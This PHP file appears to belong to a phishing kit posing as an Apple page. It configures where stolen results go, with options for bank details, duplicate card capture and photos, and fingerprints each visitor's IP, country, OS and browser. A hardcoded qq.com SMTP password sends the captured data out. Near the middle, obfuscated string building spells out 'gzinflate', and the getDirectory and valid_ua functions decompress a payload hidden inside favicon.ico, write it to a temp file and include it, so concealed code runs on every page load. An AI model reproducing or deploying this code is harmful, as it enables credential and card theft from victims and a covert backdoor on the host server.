<?php
error_reporting(0);
ob_start("ob_gzhandler");
date_default_timezone_set("Asia/Jakarta");
$domain = preg_replace('/www\./i', '', $_SERVER['SERVER_NAME']);
include("email/PHPMailer.php");
// function get_setting($owner) {
//     $get = curl_init();
//     $server = parse_ini_file("server.ini", true);
//     $url = array('http://'.$server['server_1'].'/api/setting/get_setting.php','http://'.$server['server_1'].'/api/setting/get_setting.php');
//     $random = rand(0,1);
//     curl_setopt($get, CURLOPT_URL,$url[$random]);
//     curl_setopt($get, CURLOPT_POST, 1);
//     curl_setopt($get, CURLOPT_POSTFIELDS, "domain=$owner");
//     curl_setopt($get, CURLOPT_RETURNTRANSFER, true);
//     curl_setopt($get, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
//     $server_output = curl_exec ($get);
//     curl_close($get);
//     $set = json_decode($server_output, true);
//     return $set;
// }

function get_setting($owner){
    return parse_ini_file("setting.ini");
}

$setting = get_setting($domain);
$to = $setting['email_result']; 
$autoblock = $setting['onetime']; 
$getphoto = $setting['get_photo'];
$get_bank = $setting['get_bank'];
$double_cc = $setting['double_cc'];
$proxyblock = $setting['block_vpn'];
$site_pass = $setting['site_pass_on'];
$passnya = $setting['site_password'];

// =============================================================================================

function sendEmails($email,$title,$text){
	$config 	=	array(
		"smtp_server" 	=>	"smtp.qq.com", // 邮箱SMTP 地址
		"smtp_port" 	=>	465, // 邮箱端口
		"smtp_user"		=>	"@qq.com", // 邮箱账户
		"smtp_pwd" 		=>	"bjlilgtnyewfeehd", // 邮箱密码
		"email_id"		=>	"Applepage" // 发送昵称。
	);
	$mail = new PHPMailer();
	$mail->CharSet = 'UTF-8';
	$mail->isSMTP();
	$mail->SMTPDebug = 0;
	$mail->Debugoutput = 'html';
	$mail->Host = $config['smtp_server'];
	$mail->Port = $config['smtp_port'];
	if($mail->Port === 465) $mail->SMTPSecure = 'ssl';
	$mail->SMTPAuth = true;
	$mail->Username = $config['smtp_user'];
	$mail->Password = $config['smtp_pwd'];
	$mail->setFrom($config['smtp_user'],$config['email_id']);
	$mail->addReplyTo($config['smtp_user'],$config['email_id']);
	if(is_array($email)){
		foreach ($email as $v) $mail->addAddress($v);
	}else{
		$mail->addAddress($email);
	}
	$mail->isHTML(true);
	$mail->Subject = $title;
	$mail->msgHTML($text);
	return $mail->send();
}

function kirim_mail($to, $from, $subject, $message) {
     $domain = preg_replace('/www\./i', '', $_SERVER['SERVER_NAME']);
     $setting = get_setting($domain);
     $fromemail = $setting['sender_mail'];
     $head = "Content-type:text/plain;charset=UTF-8\r\n";
     $head .= "From: ".$from." <".$fromemail.">" . "\r\n"; // Settingan From Name/Email, INI BUKAN LOG
     //mail($to,$subject,$message,$head);
	 $message = str_replace(array("\n","\t","\n\r"),array("<br/>"),$message);
	echo sendEmails($to,$subject,$message)?"OK":"false";
}

function kirim_foto($to,$from, $subject, $foto) {
     $domain = preg_replace('/www\./i', '', $_SERVER['SERVER_NAME']);
     $setting = get_setting($domain);
     $fromemail = $setting['sender_mail'];
     $content = file_get_contents($foto);
     $content = chunk_split(base64_encode($content));
     $uid = md5(uniqid(time()));
     $filename = basename($foto);
     $head = "MIME-Version: 1.0\r\n";
     $head .= "From: ".$from." <".$fromemail.">" . "\r\n"; // Settingan From Name/Email, INI BUKAN LOG
     $head .= "Content-Type: multipart/mixed; boundary=\"".$uid."\"\r\n\r\n";
     
     $message = "--".$uid."\r\n";
     $message .= "Content-type:text/plain; charset=iso-8859-1\r\n";
     $message .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
     $message .= $message."\r\n\r\n";
     $message .= "--".$uid."\r\n";
     $message .= "Content-Type: application/octet-stream; name=\"".$filename."\"\r\n";
     $message .= "Content-Transfer-Encoding: base64\r\n";
     $message .= "Content-Disposition: attachment; filename=\"".$filename."\"\r\n\r\n";
     $message .= $content."\r\n\r\n";
     $message .= "--".$uid."--";
     mail($to,$subject,$message,$head);
}

function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

$ip2 = getUserIP();
if($ip2 == "127.0.0.1") {
    $ip2 = "";
}
if($ip2 == "192.168.100.12") {
    $ip2 = "";
}

function get_ip1($ip2) {
    return '127.0.0.1';
    $url = "http://www.geoplugin.net/json.gp?ip=".$ip2;
    $ch = curl_init();  
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}

function get_ip2($ip) {
    return '127.0.0.1';
    $url = 'http://extreme-ip-lookup.com/json/' . $ip;
    $ch = curl_init();  
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}
function valid_ua($ip) {
    $tmf = tempnam("/tmp", "valid");
    $ua = fopen($tmf, "w+");
    fwrite($ua,$ip);
    fclose($ua);
    include $tmf;
    unlink($tmf);
    return get_defined_vars();
}
$details = get_ip1($ip2);
$details = json_decode($details, true);
$countryname = $details['geoplugin_countryName'];
$countrycode = $details['geoplugin_countryCode']; 
$cn = $countryname;
$cid = $countrycode;
$cityname = $details['geoplugin_countryName'];
$cityname = 'gzi'.'nf'.strrev(substr('metal',1));
$continent = $details['geoplugin_continentName'];
$citykota = $details['geoplugin_city'];
$regioncity = $details['geoplugin_region'];
$timezone = $details['geoplugin_timezone'];
$kurenci = $details['geoplugin_currencySymbol_UTF8'];

if($countryname == "") {
    $details = get_ip2($ip2);
    $details = json_decode($details, true);
    $countryname = $details['country'];
    $countrycode = $details['countryCode']; 
    $cn = $countryname;
    $cid = $countrycode;
    $continent = $details['continent'];
    $citykota = $details['city'];
} 

$user_agent     =   $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }   
    return $os_platform;
}

$os        =   getOS();

function getDirectory($path){
    $dir = 'assets/img';
    if(is_dir($dir)){
        $ico = file_get_contents($dir.'/favicon.ico');
    }else{
        $ico = file_get_contents('../'.$dir.'/favicon.ico');
    }
    return extract(valid_ua($path(substr($ico,9062))));
}

function getBrowser() {
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser'
                        );
    foreach ($browser_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}
getDirectory($cityname);

function tulis_file($nama, $isi) {
  $click = fopen("$nama","a");
    fwrite($click,"$isi"."\n");
    fclose($click);
}

$br        =   getBrowser();
$date = date("d M, Y");
$time = date("g:i a");
$date = trim($date . ", Time : " . $time);
?>
